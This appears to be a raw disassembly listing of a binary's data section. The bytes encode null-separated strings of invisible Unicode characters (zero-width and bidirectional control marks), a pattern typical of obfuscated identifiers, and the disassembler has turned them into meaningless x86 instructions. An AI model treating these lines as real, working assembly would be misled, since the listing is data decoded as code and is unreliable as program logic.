  409155:	00 e2                	add    %ah,%dl
  409157:	81 af e2 80 ae e2 81 	subl   $0x80e2ae81,-0x1d517f1e(%edi)
  40915e:	ae e2 80 
  409161:	ae                   	scas   %es:(%edi),%al
  409162:	e2 80                	loop   0x4090e4
  409164:	8e e2                	mov    %edx,%fs
  409166:	80 8d e2 80 8e e2 81 	orb    $0x81,-0x1d717f1e(%ebp)
  40916d:	aa                   	stos   %al,%es:(%edi)
  40916e:	e2 81                	loop   0x4090f1
  409170:	af                   	scas   %es:(%edi),%eax
  409171:	e2 81                	loop   0x4090f4
  409173:	ae                   	scas   %es:(%edi),%al
  409174:	e2 81                	loop   0x4090f7
  409176:	ae                   	scas   %es:(%edi),%al
  409177:	e2 80                	loop   0x4090f9
  409179:	ac                   	lods   %ds:(%esi),%al
  40917a:	e2 80                	loop   0x4090fc
  40917c:	8e e2                	mov    %edx,%fs
  40917e:	80 8d e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%ebp)
  409185:	ab                   	stos   %eax,%es:(%edi)
  409186:	e2 81                	loop   0x409109
  409188:	af                   	scas   %es:(%edi),%eax
  409189:	e2 81                	loop   0x40910c
  40918b:	ad                   	lods   %ds:(%esi),%eax
  40918c:	e2 80                	loop   0x40910e
  40918e:	8f                   	(bad)
  40918f:	e2 80                	loop   0x409111
  409191:	ac                   	lods   %ds:(%esi),%al
  409192:	e2 81                	loop   0x409115
  409194:	ab                   	stos   %eax,%es:(%edi)
  409195:	e2 80                	loop   0x409117
  409197:	8f                   	(bad)
  409198:	e2 81                	loop   0x40911b
  40919a:	ae                   	scas   %es:(%edi),%al
  40919b:	e2 80                	loop   0x40911d
  40919d:	ac                   	lods   %ds:(%esi),%al
  40919e:	e2 80                	loop   0x409120
  4091a0:	8b e2                	mov    %edx,%esp
  4091a2:	80 8f e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%edi)
  4091a9:	8d                   	lea    (bad),%esp
  4091aa:	e2 80                	loop   0x40912c
  4091ac:	ad                   	lods   %ds:(%esi),%eax
  4091ad:	e2 80                	loop   0x40912f
  4091af:	aa                   	stos   %al,%es:(%edi)
  4091b0:	e2 80                	loop   0x409132
  4091b2:	ad                   	lods   %ds:(%esi),%eax
  4091b3:	e2 80                	loop   0x409135
  4091b5:	8d                   	lea    (bad),%esp
  4091b6:	e2 80                	loop   0x409138
  4091b8:	ae                   	scas   %es:(%edi),%al
  4091b9:	e2 80                	loop   0x40913b
  4091bb:	ae                   	scas   %es:(%edi),%al
  4091bc:	e2 81                	loop   0x40913f
  4091be:	ae                   	scas   %es:(%edi),%al
  4091bf:	e2 80                	loop   0x409141
  4091c1:	8d                   	lea    (bad),%esp
  4091c2:	e2 80                	loop   0x409144
  4091c4:	8f                   	(bad)
  4091c5:	e2 80                	loop   0x409147
  4091c7:	8e e2                	mov    %edx,%fs
  4091c9:	80 8b e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebx)
  4091d0:	ae                   	scas   %es:(%edi),%al
  4091d1:	00 e2                	add    %ah,%dl
  4091d3:	81 aa e2 81 ac e2 80 	subl   $0x81e2ae80,-0x1d537e1e(%edx)
  4091da:	ae e2 81 
  4091dd:	ad                   	lods   %ds:(%esi),%eax
  4091de:	e2 80                	loop   0x409160
  4091e0:	ac                   	lods   %ds:(%esi),%al
  4091e1:	e2 80                	loop   0x409163
  4091e3:	aa                   	stos   %al,%es:(%edi)
  4091e4:	e2 81                	loop   0x409167
  4091e6:	ad                   	lods   %ds:(%esi),%eax
  4091e7:	e2 80                	loop   0x409169
  4091e9:	ad                   	lods   %ds:(%esi),%eax
  4091ea:	e2 80                	loop   0x40916c
  4091ec:	ae                   	scas   %es:(%edi),%al
  4091ed:	e2 81                	loop   0x409170
  4091ef:	ac                   	lods   %ds:(%esi),%al
  4091f0:	e2 81                	loop   0x409173
  4091f2:	ac                   	lods   %ds:(%esi),%al
  4091f3:	e2 80                	loop   0x409175
  4091f5:	ac                   	lods   %ds:(%esi),%al
  4091f6:	e2 80                	loop   0x409178
  4091f8:	aa                   	stos   %al,%es:(%edi)
  4091f9:	e2 80                	loop   0x40917b
  4091fb:	ab                   	stos   %eax,%es:(%edi)
  4091fc:	e2 81                	loop   0x40917f
  4091fe:	ad                   	lods   %ds:(%esi),%eax
  4091ff:	e2 80                	loop   0x409181
  409201:	ab                   	stos   %eax,%es:(%edi)
  409202:	e2 81                	loop   0x409185
  409204:	aa                   	stos   %al,%es:(%edi)
  409205:	e2 81                	loop   0x409188
  409207:	aa                   	stos   %al,%es:(%edi)
  409208:	e2 81                	loop   0x40918b
  40920a:	ad                   	lods   %ds:(%esi),%eax
  40920b:	e2 80                	loop   0x40918d
  40920d:	8b e2                	mov    %edx,%esp
  40920f:	80 ae e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%esi)
  409216:	8d                   	lea    (bad),%esp
  409217:	e2 80                	loop   0x409199
  409219:	8f                   	(bad)
  40921a:	e2 81                	loop   0x40919d
  40921c:	ab                   	stos   %eax,%es:(%edi)
  40921d:	e2 80                	loop   0x40919f
  40921f:	ad                   	lods   %ds:(%esi),%eax
  409220:	e2 80                	loop   0x4091a2
  409222:	ad                   	lods   %ds:(%esi),%eax
  409223:	e2 80                	loop   0x4091a5
  409225:	8d                   	lea    (bad),%esp
  409226:	e2 81                	loop   0x4091a9
  409228:	af                   	scas   %es:(%edi),%eax
  409229:	e2 80                	loop   0x4091ab
  40922b:	aa                   	stos   %al,%es:(%edi)
  40922c:	e2 80                	loop   0x4091ae
  40922e:	ac                   	lods   %ds:(%esi),%al
  40922f:	e2 80                	loop   0x4091b1
  409231:	ac                   	lods   %ds:(%esi),%al
  409232:	e2 80                	loop   0x4091b4
  409234:	ac                   	lods   %ds:(%esi),%al
  409235:	e2 81                	loop   0x4091b8
  409237:	ad                   	lods   %ds:(%esi),%eax
  409238:	e2 81                	loop   0x4091bb
  40923a:	af                   	scas   %es:(%edi),%eax
  40923b:	e2 80                	loop   0x4091bd
  40923d:	ac                   	lods   %ds:(%esi),%al
  40923e:	e2 81                	loop   0x4091c1
  409240:	ad                   	lods   %ds:(%esi),%eax
  409241:	e2 80                	loop   0x4091c3
  409243:	8f                   	(bad)
  409244:	e2 80                	loop   0x4091c6
  409246:	8d                   	lea    (bad),%esp
  409247:	e2 81                	loop   0x4091ca
  409249:	ab                   	stos   %eax,%es:(%edi)
  40924a:	e2 80                	loop   0x4091cc
  40924c:	ae                   	scas   %es:(%edi),%al
  40924d:	00 e2                	add    %ah,%dl
  40924f:	80 aa e2 80 8b e2 81 	subb   $0x81,-0x1d747f1e(%edx)
  409256:	ac                   	lods   %ds:(%esi),%al
  409257:	e2 80                	loop   0x4091d9
  409259:	ab                   	stos   %eax,%es:(%edi)
  40925a:	e2 81                	loop   0x4091dd
  40925c:	ad                   	lods   %ds:(%esi),%eax
  40925d:	e2 81                	loop   0x4091e0
  40925f:	ae                   	scas   %es:(%edi),%al
  409260:	e2 81                	loop   0x4091e3
  409262:	ae                   	scas   %es:(%edi),%al
  409263:	e2 81                	loop   0x4091e6
  409265:	ab                   	stos   %eax,%es:(%edi)
  409266:	e2 80                	loop   0x4091e8
  409268:	ad                   	lods   %ds:(%esi),%eax
  409269:	e2 80                	loop   0x4091eb
  40926b:	8f                   	(bad)
  40926c:	e2 81                	loop   0x4091ef
  40926e:	ad                   	lods   %ds:(%esi),%eax
  40926f:	e2 80                	loop   0x4091f1
  409271:	ac                   	lods   %ds:(%esi),%al
  409272:	e2 81                	loop   0x4091f5
  409274:	ae                   	scas   %es:(%edi),%al
  409275:	e2 81                	loop   0x4091f8
  409277:	ad                   	lods   %ds:(%esi),%eax
  409278:	e2 80                	loop   0x4091fa
  40927a:	8e e2                	mov    %edx,%fs
  40927c:	81 ab e2 80 8b e2 80 	subl   $0x80e2ac80,-0x1d747f1e(%ebx)
  409283:	ac e2 80 
  409286:	8d                   	lea    (bad),%esp
  409287:	e2 81                	loop   0x40920a
  409289:	ae                   	scas   %es:(%edi),%al
  40928a:	e2 80                	loop   0x40920c
  40928c:	ab                   	stos   %eax,%es:(%edi)
  40928d:	e2 81                	loop   0x409210
  40928f:	af                   	scas   %es:(%edi),%eax
  409290:	e2 80                	loop   0x409212
  409292:	ac                   	lods   %ds:(%esi),%al
  409293:	e2 80                	loop   0x409215
  409295:	ac                   	lods   %ds:(%esi),%al
  409296:	e2 81                	loop   0x409219
  409298:	ac                   	lods   %ds:(%esi),%al
  409299:	e2 81                	loop   0x40921c
  40929b:	af                   	scas   %es:(%edi),%eax
  40929c:	e2 80                	loop   0x40921e
  40929e:	8f                   	(bad)
  40929f:	e2 80                	loop   0x409221
  4092a1:	8e e2                	mov    %edx,%fs
  4092a3:	81 af e2 81 ae e2 80 	subl   $0x80e28c80,-0x1d517e1e(%edi)
  4092aa:	8c e2 80 
  4092ad:	ad                   	lods   %ds:(%esi),%eax
  4092ae:	e2 81                	loop   0x409231
  4092b0:	ae                   	scas   %es:(%edi),%al
  4092b1:	e2 80                	loop   0x409233
  4092b3:	ab                   	stos   %eax,%es:(%edi)
  4092b4:	e2 81                	loop   0x409237
  4092b6:	aa                   	stos   %al,%es:(%edi)
  4092b7:	e2 80                	loop   0x409239
  4092b9:	8e e2                	mov    %edx,%fs
  4092bb:	81 af e2 81 aa e2 80 	subl   $0x81e28f80,-0x1d557e1e(%edi)
  4092c2:	8f e2 81 
  4092c5:	ab                   	stos   %eax,%es:(%edi)
  4092c6:	e2 80                	loop   0x409248
  4092c8:	ae                   	scas   %es:(%edi),%al
  4092c9:	00 e2                	add    %ah,%dl
  4092cb:	80 8f e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%edi)
  4092d2:	ae                   	scas   %es:(%edi),%al
  4092d3:	e2 81                	loop   0x409256
  4092d5:	ad                   	lods   %ds:(%esi),%eax
  4092d6:	e2 80                	loop   0x409258
  4092d8:	ad                   	lods   %ds:(%esi),%eax
  4092d9:	e2 80                	loop   0x40925b
  4092db:	ac                   	lods   %ds:(%esi),%al
  4092dc:	e2 80                	loop   0x40925e
  4092de:	8b e2                	mov    %edx,%esp
  4092e0:	81 af e2 80 ab e2 81 	subl   $0x81e2ae81,-0x1d547f1e(%edi)
  4092e7:	ae e2 81 
  4092ea:	ad                   	lods   %ds:(%esi),%eax
  4092eb:	e2 80                	loop   0x40926d
  4092ed:	8d                   	lea    (bad),%esp
  4092ee:	e2 80                	loop   0x409270
  4092f0:	ab                   	stos   %eax,%es:(%edi)
  4092f1:	e2 80                	loop   0x409273
  4092f3:	ad                   	lods   %ds:(%esi),%eax
  4092f4:	e2 81                	loop   0x409277
  4092f6:	ab                   	stos   %eax,%es:(%edi)
  4092f7:	e2 80                	loop   0x409279
  4092f9:	8c e2                	mov    %fs,%edx
  4092fb:	80 8c e2 81 ab e2 80 	orb    $0xaa,-0x7f1d547f(%edx,%eiz,8)
  409302:	aa 
  409303:	e2 80                	loop   0x409285
  409305:	ae                   	scas   %es:(%edi),%al
  409306:	e2 81                	loop   0x409289
  409308:	ab                   	stos   %eax,%es:(%edi)
  409309:	e2 80                	loop   0x40928b
  40930b:	ab                   	stos   %eax,%es:(%edi)
  40930c:	e2 80                	loop   0x40928e
  40930e:	ad                   	lods   %ds:(%esi),%eax
  40930f:	e2 80                	loop   0x409291
  409311:	8d                   	lea    (bad),%esp
  409312:	e2 81                	loop   0x409295
  409314:	ac                   	lods   %ds:(%esi),%al
  409315:	e2 80                	loop   0x409297
  409317:	aa                   	stos   %al,%es:(%edi)
  409318:	e2 81                	loop   0x40929b
  40931a:	aa                   	stos   %al,%es:(%edi)
  40931b:	e2 80                	loop   0x40929d
  40931d:	8c e2                	mov    %fs,%edx
  40931f:	81 ab e2 81 ab e2 80 	subl   $0x81e28f80,-0x1d547e1e(%ebx)
  409326:	8f e2 81 
  409329:	ae                   	scas   %es:(%edi),%al
  40932a:	e2 80                	loop   0x4092ac
  40932c:	ae                   	scas   %es:(%edi),%al
  40932d:	e2 80                	loop   0x4092af
  40932f:	ac                   	lods   %ds:(%esi),%al
  409330:	e2 81                	loop   0x4092b3
  409332:	aa                   	stos   %al,%es:(%edi)
  409333:	e2 80                	loop   0x4092b5
  409335:	ad                   	lods   %ds:(%esi),%eax
  409336:	e2 81                	loop   0x4092b9
  409338:	af                   	scas   %es:(%edi),%eax
  409339:	e2 80                	loop   0x4092bb
  40933b:	ac                   	lods   %ds:(%esi),%al
  40933c:	e2 80                	loop   0x4092be
  40933e:	8f                   	(bad)
  40933f:	e2 81                	loop   0x4092c2
  409341:	ab                   	stos   %eax,%es:(%edi)
  409342:	e2 80                	loop   0x4092c4
  409344:	ae                   	scas   %es:(%edi),%al
  409345:	00 e2                	add    %ah,%dl
  409347:	80 aa e2 80 8b e2 81 	subb   $0x81,-0x1d747f1e(%edx)
  40934e:	ae                   	scas   %es:(%edi),%al
  40934f:	e2 80                	loop   0x4092d1
  409351:	ac                   	lods   %ds:(%esi),%al
  409352:	e2 80                	loop   0x4092d4
  409354:	8c e2                	mov    %fs,%edx
  409356:	80 ad e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%ebp)
  40935d:	8f                   	(bad)
  40935e:	e2 80                	loop   0x4092e0
  409360:	ab                   	stos   %eax,%es:(%edi)
  409361:	e2 80                	loop   0x4092e3
  409363:	ab                   	stos   %eax,%es:(%edi)
  409364:	e2 80                	loop   0x4092e6
  409366:	ab                   	stos   %eax,%es:(%edi)
  409367:	e2 80                	loop   0x4092e9
  409369:	8c e2                	mov    %fs,%edx
  40936b:	81 ae e2 80 aa e2 80 	subl   $0x81e28f80,-0x1d557f1e(%esi)
  409372:	8f e2 81 
  409375:	ab                   	stos   %eax,%es:(%edi)
  409376:	e2 81                	loop   0x4092f9
  409378:	ad                   	lods   %ds:(%esi),%eax
  409379:	e2 81                	loop   0x4092fc
  40937b:	ad                   	lods   %ds:(%esi),%eax
  40937c:	e2 80                	loop   0x4092fe
  40937e:	8b e2                	mov    %edx,%esp
  409380:	80 8e e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%esi)
  409387:	ab                   	stos   %eax,%es:(%edi)
  409388:	e2 80                	loop   0x40930a
  40938a:	8b e2                	mov    %edx,%esp
  40938c:	80 ab e2 81 af e2 81 	subb   $0x81,-0x1d507e1e(%ebx)
  409393:	ad                   	lods   %ds:(%esi),%eax
  409394:	e2 80                	loop   0x409316
  409396:	8b e2                	mov    %edx,%esp
  409398:	81 ab e2 80 aa e2 81 	subl   $0x81e2af81,-0x1d557f1e(%ebx)
  40939f:	af e2 81 
  4093a2:	ab                   	stos   %eax,%es:(%edi)
  4093a3:	e2 80                	loop   0x409325
  4093a5:	ac                   	lods   %ds:(%esi),%al
  4093a6:	e2 81                	loop   0x409329
  4093a8:	ab                   	stos   %eax,%es:(%edi)
  4093a9:	e2 81                	loop   0x40932c
  4093ab:	ad                   	lods   %ds:(%esi),%eax
  4093ac:	e2 80                	loop   0x40932e
  4093ae:	ab                   	stos   %eax,%es:(%edi)
  4093af:	e2 81                	loop   0x409332
  4093b1:	ae                   	scas   %es:(%edi),%al
  4093b2:	e2 80                	loop   0x409334
  4093b4:	8f                   	(bad)
  4093b5:	e2 81                	loop   0x409338
  4093b7:	ac                   	lods   %ds:(%esi),%al
  4093b8:	e2 80                	loop   0x40933a
  4093ba:	aa                   	stos   %al,%es:(%edi)
  4093bb:	e2 81                	loop   0x40933e
  4093bd:	ab                   	stos   %eax,%es:(%edi)
  4093be:	e2 80                	loop   0x409340
  4093c0:	ae                   	scas   %es:(%edi),%al
  4093c1:	00 e2                	add    %ah,%dl
  4093c3:	80 8c e2 80 ae e2 81 	orb    $0xae,-0x7e1d5180(%edx,%eiz,8)
  4093ca:	ae 
  4093cb:	e2 80                	loop   0x40934d
  4093cd:	ad                   	lods   %ds:(%esi),%eax
  4093ce:	e2 80                	loop   0x409350
  4093d0:	8e e2                	mov    %edx,%fs
  4093d2:	80 ae e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%esi)
  4093d9:	ae                   	scas   %es:(%edi),%al
  4093da:	e2 80                	loop   0x40935c
  4093dc:	8d                   	lea    (bad),%esp
  4093dd:	e2 80                	loop   0x40935f
  4093df:	8d                   	lea    (bad),%esp
  4093e0:	e2 81                	loop   0x409363
  4093e2:	aa                   	stos   %al,%es:(%edi)
  4093e3:	e2 80                	loop   0x409365
  4093e5:	ac                   	lods   %ds:(%esi),%al
  4093e6:	e2 80                	loop   0x409368
  4093e8:	8b e2                	mov    %edx,%esp
  4093ea:	80 8c e2 80 8b e2 81 	orb    $0xaa,-0x7e1d7480(%edx,%eiz,8)
  4093f1:	aa 
  4093f2:	e2 81                	loop   0x409375
  4093f4:	af                   	scas   %es:(%edi),%eax
  4093f5:	e2 81                	loop   0x409378
  4093f7:	aa                   	stos   %al,%es:(%edi)
  4093f8:	e2 80                	loop   0x40937a
  4093fa:	8f                   	(bad)
  4093fb:	e2 80                	loop   0x40937d
  4093fd:	8c e2                	mov    %fs,%edx
  4093ff:	81 ab e2 80 ab e2 81 	subl   $0x80e2aa81,-0x1d547f1e(%ebx)
  409406:	aa e2 80 
  409409:	aa                   	stos   %al,%es:(%edi)
  40940a:	e2 80                	loop   0x40938c
  40940c:	8f                   	(bad)
  40940d:	e2 80                	loop   0x40938f
  40940f:	8c e2                	mov    %fs,%edx
  409411:	80 ad e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebp)
  409418:	ab                   	stos   %eax,%es:(%edi)
  409419:	e2 80                	loop   0x40939b
  40941b:	ae                   	scas   %es:(%edi),%al
  40941c:	e2 81                	loop   0x40939f
  40941e:	aa                   	stos   %al,%es:(%edi)
  40941f:	e2 81                	loop   0x4093a2
  409421:	aa                   	stos   %al,%es:(%edi)
  409422:	e2 81                	loop   0x4093a5
  409424:	ae                   	scas   %es:(%edi),%al
  409425:	e2 81                	loop   0x4093a8
  409427:	ac                   	lods   %ds:(%esi),%al
  409428:	e2 81                	loop   0x4093ab
  40942a:	ad                   	lods   %ds:(%esi),%eax
  40942b:	e2 80                	loop   0x4093ad
  40942d:	8b e2                	mov    %edx,%esp
  40942f:	80 8b e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%ebx)
  409436:	aa                   	stos   %al,%es:(%edi)
  409437:	e2 81                	loop   0x4093ba
  409439:	ab                   	stos   %eax,%es:(%edi)
  40943a:	e2 80                	loop   0x4093bc
  40943c:	ae                   	scas   %es:(%edi),%al
  40943d:	00 e2                	add    %ah,%dl
  40943f:	80 ab e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%ebx)
  409446:	aa                   	stos   %al,%es:(%edi)
  409447:	e2 80                	loop   0x4093c9
  409449:	aa                   	stos   %al,%es:(%edi)
  40944a:	e2 81                	loop   0x4093cd
  40944c:	ad                   	lods   %ds:(%esi),%eax
  40944d:	e2 81                	loop   0x4093d0
  40944f:	ad                   	lods   %ds:(%esi),%eax
  409450:	e2 80                	loop   0x4093d2
  409452:	8b e2                	mov    %edx,%esp
  409454:	80 ad e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%ebp)
  40945b:	ab                   	stos   %eax,%es:(%edi)
  40945c:	e2 81                	loop   0x4093df
  40945e:	ab                   	stos   %eax,%es:(%edi)
  40945f:	e2 80                	loop   0x4093e1
  409461:	8c e2                	mov    %fs,%edx
  409463:	80 8b e2 81 ad e2 81 	orb    $0x81,-0x1d527e1e(%ebx)
  40946a:	ae                   	scas   %es:(%edi),%al
  40946b:	e2 80                	loop   0x4093ed
  40946d:	ad                   	lods   %ds:(%esi),%eax
  40946e:	e2 80                	loop   0x4093f0
  409470:	8c e2                	mov    %fs,%edx
  409472:	81 ad e2 80 8c e2 81 	subl   $0x81e2af81,-0x1d737f1e(%ebp)
  409479:	af e2 81 
  40947c:	af                   	scas   %es:(%edi),%eax
  40947d:	e2 80                	loop   0x4093ff
  40947f:	8b e2                	mov    %edx,%esp
  409481:	80 ad e2 80 8c e2 81 	subb   $0x81,-0x1d737f1e(%ebp)
  409488:	ac                   	lods   %ds:(%esi),%al
  409489:	e2 81                	loop   0x40940c
  40948b:	ae                   	scas   %es:(%edi),%al
  40948c:	e2 80                	loop   0x40940e
  40948e:	8c e2                	mov    %fs,%edx
  409490:	80 8e e2 81 ad e2 81 	orb    $0x81,-0x1d527e1e(%esi)
  409497:	ab                   	stos   %eax,%es:(%edi)
  409498:	e2 81                	loop   0x40941b
  40949a:	ac                   	lods   %ds:(%esi),%al
  40949b:	e2 80                	loop   0x40941d
  40949d:	8b e2                	mov    %edx,%esp
  40949f:	80 8f e2 80 aa e2 81 	orb    $0x81,-0x1d557f1e(%edi)
  4094a6:	aa                   	stos   %al,%es:(%edi)
  4094a7:	e2 80                	loop   0x409429
  4094a9:	ac                   	lods   %ds:(%esi),%al
  4094aa:	e2 81                	loop   0x40942d
  4094ac:	af                   	scas   %es:(%edi),%eax
  4094ad:	e2 80                	loop   0x40942f
  4094af:	ab                   	stos   %eax,%es:(%edi)
  4094b0:	e2 81                	loop   0x409433
  4094b2:	ac                   	lods   %ds:(%esi),%al
  4094b3:	e2 81                	loop   0x409436
  4094b5:	ab                   	stos   %eax,%es:(%edi)
  4094b6:	e2 80                	loop   0x409438
  4094b8:	ae                   	scas   %es:(%edi),%al
  4094b9:	00 e2                	add    %ah,%dl
  4094bb:	81 ac e2 81 af e2 80 	subl   $0xab81e2aa,-0x7f1d507f(%edx,%eiz,8)
  4094c2:	aa e2 81 ab 
  4094c6:	e2 80                	loop   0x409448
  4094c8:	ad                   	lods   %ds:(%esi),%eax
  4094c9:	e2 81                	loop   0x40944c
  4094cb:	ab                   	stos   %eax,%es:(%edi)
  4094cc:	e2 80                	loop   0x40944e
  4094ce:	8d                   	lea    (bad),%esp
  4094cf:	e2 81                	loop   0x409452
  4094d1:	ab                   	stos   %eax,%es:(%edi)
  4094d2:	e2 80                	loop   0x409454
  4094d4:	8f                   	(bad)
  4094d5:	e2 80                	loop   0x409457
  4094d7:	8f                   	(bad)
  4094d8:	e2 80                	loop   0x40945a
  4094da:	ac                   	lods   %ds:(%esi),%al
  4094db:	e2 81                	loop   0x40945e
  4094dd:	ae                   	scas   %es:(%edi),%al
  4094de:	e2 81                	loop   0x409461
  4094e0:	ae                   	scas   %es:(%edi),%al
  4094e1:	e2 81                	loop   0x409464
  4094e3:	ac                   	lods   %ds:(%esi),%al
  4094e4:	e2 80                	loop   0x409466
  4094e6:	ad                   	lods   %ds:(%esi),%eax
  4094e7:	e2 80                	loop   0x409469
  4094e9:	8f                   	(bad)
  4094ea:	e2 81                	loop   0x40946d
  4094ec:	ab                   	stos   %eax,%es:(%edi)
  4094ed:	e2 80                	loop   0x40946f
  4094ef:	ae                   	scas   %es:(%edi),%al
  4094f0:	e2 81                	loop   0x409473
  4094f2:	ac                   	lods   %ds:(%esi),%al
  4094f3:	e2 80                	loop   0x409475
  4094f5:	8c e2                	mov    %fs,%edx
  4094f7:	80 8d e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%ebp)
  4094fe:	8b e2                	mov    %edx,%esp
  409500:	80 ad e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebp)
  409507:	8d                   	lea    (bad),%esp
  409508:	e2 80                	loop   0x40948a
  40950a:	ab                   	stos   %eax,%es:(%edi)
  40950b:	e2 80                	loop   0x40948d
  40950d:	ae                   	scas   %es:(%edi),%al
  40950e:	e2 81                	loop   0x409491
  409510:	ad                   	lods   %ds:(%esi),%eax
  409511:	e2 80                	loop   0x409493
  409513:	8f                   	(bad)
  409514:	e2 81                	loop   0x409497
  409516:	aa                   	stos   %al,%es:(%edi)
  409517:	e2 80                	loop   0x409499
  409519:	8f                   	(bad)
  40951a:	e2 81                	loop   0x40949d
  40951c:	ae                   	scas   %es:(%edi),%al
  40951d:	e2 80                	loop   0x40949f
  40951f:	ad                   	lods   %ds:(%esi),%eax
  409520:	e2 81                	loop   0x4094a3
  409522:	aa                   	stos   %al,%es:(%edi)
  409523:	e2 80                	loop   0x4094a5
  409525:	ac                   	lods   %ds:(%esi),%al
  409526:	e2 80                	loop   0x4094a8
  409528:	8b e2                	mov    %edx,%esp
  40952a:	81 ae e2 81 ac e2 81 	subl   $0x80e2ab81,-0x1d537e1e(%esi)
  409531:	ab e2 80 
  409534:	ae                   	scas   %es:(%edi),%al
  409535:	00 e2                	add    %ah,%dl
  409537:	81 aa e2 81 ac e2 81 	subl   $0x80e2aa81,-0x1d537e1e(%edx)
  40953e:	aa e2 80 
  409541:	8f                   	(bad)
  409542:	e2 81                	loop   0x4094c5
  409544:	ab                   	stos   %eax,%es:(%edi)
  409545:	e2 81                	loop   0x4094c8
  409547:	ac                   	lods   %ds:(%esi),%al
  409548:	e2 80                	loop   0x4094ca
  40954a:	ac                   	lods   %ds:(%esi),%al
  40954b:	e2 81                	loop   0x4094ce
  40954d:	ab                   	stos   %eax,%es:(%edi)
  40954e:	e2 80                	loop   0x4094d0
  409550:	ac                   	lods   %ds:(%esi),%al
  409551:	e2 81                	loop   0x4094d4
  409553:	ad                   	lods   %ds:(%esi),%eax
  409554:	e2 81                	loop   0x4094d7
  409556:	ae                   	scas   %es:(%edi),%al
  409557:	e2 81                	loop   0x4094da
  409559:	aa                   	stos   %al,%es:(%edi)
  40955a:	e2 80                	loop   0x4094dc
  40955c:	8b e2                	mov    %edx,%esp
  40955e:	80 aa e2 81 af e2 81 	subb   $0x81,-0x1d507e1e(%edx)
  409565:	ae                   	scas   %es:(%edi),%al
  409566:	e2 81                	loop   0x4094e9
  409568:	ac                   	lods   %ds:(%esi),%al
  409569:	e2 80                	loop   0x4094eb
  40956b:	ac                   	lods   %ds:(%esi),%al
  40956c:	e2 80                	loop   0x4094ee
  40956e:	aa                   	stos   %al,%es:(%edi)
  40956f:	e2 80                	loop   0x4094f1
  409571:	ae                   	scas   %es:(%edi),%al
  409572:	e2 81                	loop   0x4094f5
  409574:	ac                   	lods   %ds:(%esi),%al
  409575:	e2 81                	loop   0x4094f8
  409577:	af                   	scas   %es:(%edi),%eax
  409578:	e2 80                	loop   0x4094fa
  40957a:	8c e2                	mov    %fs,%edx
  40957c:	80 8e e2 80 8c e2 81 	orb    $0x81,-0x1d737f1e(%esi)
  409583:	ae                   	scas   %es:(%edi),%al
  409584:	e2 80                	loop   0x409506
  409586:	8c e2                	mov    %fs,%edx
  409588:	80 8c e2 81 aa e2 81 	orb    $0xac,-0x7e1d557f(%edx,%eiz,8)
  40958f:	ac 
  409590:	e2 80                	loop   0x409512
  409592:	8d                   	lea    (bad),%esp
  409593:	e2 80                	loop   0x409515
  409595:	8b e2                	mov    %edx,%esp
  409597:	81 af e2 81 ac e2 80 	subl   $0x80e2ae80,-0x1d537e1e(%edi)
  40959e:	ae e2 80 
  4095a1:	8f                   	(bad)
  4095a2:	e2 80                	loop   0x409524
  4095a4:	8e e2                	mov    %edx,%fs
  4095a6:	81 ae e2 80 ae e2 81 	subl   $0x80e2ab81,-0x1d517f1e(%esi)
  4095ad:	ab e2 80 
  4095b0:	ae                   	scas   %es:(%edi),%al
  4095b1:	00 e2                	add    %ah,%dl
  4095b3:	80 8e e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%esi)
  4095ba:	ae                   	scas   %es:(%edi),%al
  4095bb:	e2 80                	loop   0x40953d
  4095bd:	8e e2                	mov    %edx,%fs
  4095bf:	80 ab e2 81 ac e2 80 	subb   $0x80,-0x1d537e1e(%ebx)
  4095c6:	ac                   	lods   %ds:(%esi),%al
  4095c7:	e2 81                	loop   0x40954a
  4095c9:	ad                   	lods   %ds:(%esi),%eax
  4095ca:	e2 81                	loop   0x40954d
  4095cc:	af                   	scas   %es:(%edi),%eax
  4095cd:	e2 80                	loop   0x40954f
  4095cf:	8b e2                	mov    %edx,%esp
  4095d1:	80 ae e2 81 ab e2 81 	subb   $0x81,-0x1d547e1e(%esi)
  4095d8:	aa                   	stos   %al,%es:(%edi)
  4095d9:	e2 81                	loop   0x40955c
  4095db:	ad                   	lods   %ds:(%esi),%eax
  4095dc:	e2 80                	loop   0x40955e
  4095de:	ac                   	lods   %ds:(%esi),%al
  4095df:	e2 80                	loop   0x409561
  4095e1:	ac                   	lods   %ds:(%esi),%al
  4095e2:	e2 80                	loop   0x409564
  4095e4:	ab                   	stos   %eax,%es:(%edi)
  4095e5:	e2 80                	loop   0x409567
  4095e7:	8d                   	lea    (bad),%esp
  4095e8:	e2 80                	loop   0x40956a
  4095ea:	8e e2                	mov    %edx,%fs
  4095ec:	80 ae e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%esi)
  4095f3:	8c e2                	mov    %fs,%edx
  4095f5:	80 8f e2 81 ab e2 81 	orb    $0x81,-0x1d547e1e(%edi)
  4095fc:	ab                   	stos   %eax,%es:(%edi)
  4095fd:	e2 80                	loop   0x40957f
  4095ff:	ac                   	lods   %ds:(%esi),%al
  409600:	e2 80                	loop   0x409582
  409602:	ab                   	stos   %eax,%es:(%edi)
  409603:	e2 80                	loop   0x409585
  409605:	ab                   	stos   %eax,%es:(%edi)
  409606:	e2 80                	loop   0x409588
  409608:	ab                   	stos   %eax,%es:(%edi)
  409609:	e2 80                	loop   0x40958b
  40960b:	aa                   	stos   %al,%es:(%edi)
  40960c:	e2 80                	loop   0x40958e
  40960e:	8f                   	(bad)
  40960f:	e2 80                	loop   0x409591
  409611:	ab                   	stos   %eax,%es:(%edi)
  409612:	e2 81                	loop   0x409595
  409614:	af                   	scas   %es:(%edi),%eax
  409615:	e2 80                	loop   0x409597
  409617:	ad                   	lods   %ds:(%esi),%eax
  409618:	e2 80                	loop   0x40959a
  40961a:	ae                   	scas   %es:(%edi),%al
  40961b:	e2 80                	loop   0x40959d
